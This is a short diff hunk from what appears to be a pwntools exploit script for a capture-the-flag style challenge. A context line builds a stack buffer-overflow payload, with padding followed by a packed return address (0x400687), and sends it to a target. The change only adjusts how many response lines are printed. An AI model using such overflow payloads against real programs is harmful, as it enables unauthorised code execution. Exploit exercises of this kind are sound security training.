@@ -9,5 +9,6 @@ line = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + b'bbbbbbbb' + p64(0x400687)
 
 r.sendline(line)
 
-while True:
-    print(r.recvline())
+
+print(r.recvline())
+print(r.recvline())
